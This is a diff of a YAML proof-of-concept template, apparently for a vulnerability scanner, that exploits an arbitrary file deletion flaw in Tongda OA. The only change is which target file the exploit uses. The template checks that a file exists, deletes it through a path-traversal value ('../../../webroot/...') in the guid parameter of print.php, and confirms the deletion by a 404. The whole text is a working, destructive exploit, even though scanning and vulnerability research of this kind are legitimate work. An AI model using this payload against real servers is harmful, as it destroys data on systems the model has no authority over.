@@ -1,19 +1,19 @@
-name: poc-yaml-tongdaoa-arbitraryfiledeletion
+name: poc-yaml-tongdaoa-arbitraryfiledeletion.yml
 rules:
   - method: GET
-    path: /static/images/tongda.ico
+    path: /jpush/nategood/httpful/LICENSE.txt
     follow_redirects: false
     expression: |
-      response.status == 200 && response.content_type.contains("image/x-icon")
+      response.status == 200 && response.content_type.contains("text/plain")
   - method: POST
     path: >-
-      /module/appbuilder/assets/print.php?guid=../../../webroot/static/images/tongda.ico
+      /module/appbuilder/assets/print.php?guid=../../../webroot/jpush/nategood/httpful/LICENSE.txt
     follow_redirects: true
     expression: >
       response.status == 200 && response.body.bcontains(bytes("general/appbuilder/web/download.php"))
   - method: GET
     path: >-
-      /static/images/tongda.ico
+      /jpush/nategood/httpful/LICENSE.txt
     follow_redirects: true
     expression: |
       response.status == 404
